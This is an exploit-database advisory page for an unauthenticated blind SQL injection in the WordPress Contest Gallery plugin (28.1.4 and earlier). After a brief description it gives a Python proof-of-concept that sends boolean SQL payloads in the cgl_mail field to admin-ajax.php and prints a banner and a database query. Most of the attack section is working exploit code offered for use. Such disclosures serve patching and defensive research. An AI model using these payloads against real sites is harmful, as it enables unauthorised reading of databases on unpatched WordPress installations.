---
title: WordPress Contest Gallery 28.1.4 Unauthenticated Blind SQL Injection
url: https://cxsecurity.com/issue/WLB-2026060003
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-06-06
fetch_date: 2026-06-07T06:15:47.893534
---

# WordPress Contest Gallery 28.1.4 Unauthenticated Blind SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress Contest Gallery 28.1.4 Unauthenticated Blind SQL Injection** **2026.06.06**  Credit:  **[cardosource](https://cxsecurity.com/author/cardosource/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: WordPress Contest Gallery 28.1.4 - Unauthenticated Blind SQL Injection
# Google Dork: N/A
# Date: 2026-06-02
# Exploit Author: cardosource
# Vendor Homepage: https://contest-gallery.com/
# Software Link: https://wordpress.org/plugins/contest-gallery/
# Version: <= 28.1.4
# Tested on: Docker - PHP 8.2/Apache + MariaDB (WordPress Environment)
# CVE: 2026-3180
"""
Description
A Blind SQL Injection vulnerability exists in Contest Gallery versions 28.1.4 and earlier. The issue is caused by the unsafe use of the cgl\_maili parameter, where sanitize\_email() preserves the single quote (') character in the local part of an email address. As a result, user-controlled input reaches wpdb->get\_row() without proper parameterization via prepare(), allowing unauthenticated attackers to perform boolean-based blind SQL injection.
Authentication Required: No
"""
import requests
import json
NONCE = " "
URL = "http://localhost:8080/wp-admin/admin-ajax.php"
endpoint = "/wp-admin/admin-ajax.php"
url = "http://localhost:8080/"
payload = "'OR/\*\*/1=1#@teste.com' and 'OR/\*\*/1=2#@teste.com"
def send\_payload(mail):
data = {
"action": "post\_cg1l\_resend\_unconfirmed\_mail\_frontend",
"cgl\_mail": mail,
"cgl\_page\_id": "1",
"cgl\_activation\_key": "",
"cg\_nonce": NONCE,
}
return requests.post(URL, data=data)
r\_true = send\_payload("qualquer'OR/\*\*/1=1#@teste.com")
if r\_true.status\_code == 200:
status\_code = r\_true.status\_code
banner = f"""
CVE : 2026-3180 | Contest Gallery 28.1.4 : Boolean SQLi
payload :........................{payload}
end point :........................{endpoint}
url :..............................{url}
status :...........................{status\_code}
nonce :............................{NONCE}
"""
print(banner)
print(f"Body length: {len(r\_true.text)} chars")
poc =f'''\nmariadb wordpress\_db -e "
SELECT \* FROM wp\_contest\_gal1ery\_create\_user\_entries
ORDER BY Tstamp DESC LIMIT 1115;"'''
print(poc)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026060003)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top